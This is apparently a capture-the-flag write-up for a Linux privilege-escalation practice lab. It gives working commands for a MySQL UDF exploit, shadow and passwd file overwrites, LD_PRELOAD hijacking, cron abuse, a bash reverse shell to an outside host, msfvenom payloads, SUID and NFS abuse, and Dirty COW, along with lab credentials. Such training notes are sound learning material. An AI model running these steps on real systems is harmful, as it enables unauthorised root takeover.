> Linux PrivEsc

export IP=10.10.18.84

**NOTE: SSH creds. user:password321**

# Task 1: Openvpn 

# Task 2: Service Exploits

If MySQL service is running as root and has no password we can use a popular exploit in which we create an user defined function to run system commands as group via MySQL service.
Compile the .c file and follow the steps in the code's comment line

```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root

Mysql
------------------------------------------------------------------------------
use mysql;
# creating a User Defined Function (UDF) "do_system" using our exploit
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
# Use `do_system` function to copy /bin/bash to /tmp/rootbash and set the SUID permission
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
------------------------------------------------------------------------------

/tmp/rootbash -p => We are root!!
```

# Task 3 - Readable /etc/shadow

When /etc/shadow is readable we can crack the password of any user we want.

1. What is the root user's password hash?

```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

2. What hashing algorithm was used to produce the root user's password hash?

```
sha512crypt
```

3. What is the root user's password?

```
password123
```

# Weak File Permissions - Writable /etc/shadow

We can create our own password by `mkpasswd -m sha-512 Shazam12345`.
Now edit the root's hash in /etc/passwd file 

```
root:$6$Ib8H97JH$VuBFTRFG2.gMJw4CVPIQWz8PMEPOjwlyCarbtzfVJa/jOBL2hQtFOagPDWgi7JjueKOsdKmHzcf2DM7OMTZdS/:17298:0:99999:7:::
```

Now we can login using the password `Shazam12345`

# Weak File Permissions - Writable /etc/passwd

Create a password hash `openssl passwd Shazam12345` => `6docRHjcFoMak`

We can either edit `root:x:0:0:root:/root:/bin/bash` the x in here.

Like `root:6docRHjcFoMak:0:0:root:/root:/bin/bash`

						or

we can create a new root user like `newroot:6docRHjcFoMak:0:0:root:/root:/bin/bash`

id

```
uid=0(root) gid=0(root) groups=0(root)
```

# Task 6 - Shell Escape Sequences

run `sudo -l`

```
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2 => doesn't have escape sequence
    (root) NOPASSWD: /bin/more
```

## Abusing apache2

sudo apache2 -f /etc/shadow

```
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

# Task 7 - Sudo Environment Variables

sudo -l

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
## Abusing LD_PRELOAD

LD_PRELOAD is an environment variable that says “Whenever you look for a function name, look in me first!“.

NOw let's create a shared object using the code at /home/user/tools/sudo/preload.c.
Let's compile it

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Now we can choose any of the above 11 programs. Let's take iftop

`sudo LD_PRELOAD=/tmp/preload.so iftop`

Now we are in as root!! IN preload.c, the `setresuid()` sets the real user id, effective user id and saved set user id to 0 i.e) root. And we load preload.so in LD_PRELOAD and since we have sudo permissions on iftop we are root.

## LD_LIBRARY Method

ldd /usr/sbin/apache2

**NOTE: ldd prints shared objects requires by each program**

```
	linux-vdso.so.1 =>  (0x00007fff4a9dd000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f838e752000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f838e52e000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f838e2f4000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f838e0d8000)
	libc.so.6 => /lib/libc.so.6 (0x00007f838dd6c000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f838db67000)
	librt.so.1 => /lib/librt.so.1 (0x00007f838d95f000)
	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f838d728000) => we'll abuse this
	libdl.so.2 => /lib/libdl.so.2 (0x00007f838d523000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f838d2fb000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f838ec0f000)
```

Let's create the same libcrypt.so.1 using the code at `/home/user/tools/sudo/library_path.c`.

```
gcc -o /tmp/libcrypt.so.1 -fPIC -shared /home/user/tools/sudo/library_path.c 
sudo LD_LIBRARY_PATH=/tmp apache2 => We are root!!
```

# Task 8 - Cron Jobs - File Permissions

cat /etc/crontab

```
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

locate overwrite.sh => /usr/local/bin/overwrite.sh

And we notice that it is writable and we modify the file to a reverse shell.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

And we have a shell!!

# Task 9 - Cron Jobs - PATH Environment variable

Lets create our own `overwrite.sh` in /home/user

```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
chmod +x overwrite.sh

And some time later we can find /tmp/rootbash and on executing `/tmp/rootbash` we are root

# Task 10 - Cron Jobs - Wild Cards

Let's take the other cronjob `cat /usr/local/bin/compress.sh`

And the contents of the file has tar command and checking GTFO bins we have `
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
`. 

Let's create a payload `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf` and pass it to the SSH session.

Let's create 2 files

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

And we get a shell!!

# Task 11 - SUID/SGID Executables - Known Exploits

find / -type f -perm -u=s 2>/dev/null

```
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3 => Let's try this
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootbash
/sbin/mount.nfs
```

Searching in exploit-db we get `cve-2016-1531.sh` . Executing it we have root shell!

# Task 12 - SUID/SGID Executables - Shared Object Injection

Loading a shared library into a running process using strace/ptrace.

/usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

Run `/usr/local/bin/suid-so` then `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

**Output:
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$ mkdir /home/user/.config**

It searches for a particular directory, so we create it `mkdir /home/user/.config`

Compiling libcalc.c into a shared object at location suid-so is looking for.

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Now running `/usr/local/bin/suid-so` gives us root shell!!

# Task 13 - SUID/SGID Executables - Environment Variables

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

Running `/usr/local/bin/suid-env` and now running strings gives us `service apache2 start` which doesn't metntion the full path of service `/usr/sbin/service`.

Now compiling `gcc -o service /home/user/tools/suid/service.c`. Now, running `PATH=.:$PATH /usr/local/bin/suid-env` gives us root shell!!

# Task 14 - SUID / SGID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to suid-env but it has the absolut path.

Only Bash versions <4.2-048 are vulnerable to this attack. Here we are going to define shell functions that resembles the path and then export the function.

1st check for version using the command `/bin/bash --version`. Now let's create a shell function.

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Now running `/usr/local/bin/suid-env2` we get root access!

# Task 15 - SUID / SGID Executables - Abusing Shell Features (#2)

**Note: This will not work on Bash versions 4.4 and above.**

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run `/tmp/rootbash -p` gives us root shell!

# Task 16 - Passwords & Keys - History Files

Sometime we may type the password in the command line instead of the command prompt and that is stored int the history.

`cat ~/.*history | less` => mysql -h somehost.local -uroot -ppassword123

root password : su root => password123

# Task 17 - Passwords & Keys - Config Files

In myvpn.ovpn file there is a location `/etc/openvpn/auth.txt` and it has contents

```
root
password123
```

# Task 18 - Passwords & Keys - SSH Keys 

ls -l /.ssh => has root_key

COpy it into our machine and we can ssh as root.

# Task 19 - NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

cat /etc/exports => /tmp share has root squashing disabled.

Make a mount point in ubuntu

```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.18.84:/tmp /tmp/nfs
```

Create a payload `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf` 

Execute /tmp/shell.elf in SSH session

# Task 20 - Kernel Exploits

**NOTE: Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.**

Running `linux-exploit-suggester-2` we know that it is vulnerable to `dirty cow` attack.

This attack replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Now running `/usr/bin/passwd` will give us a root shell!!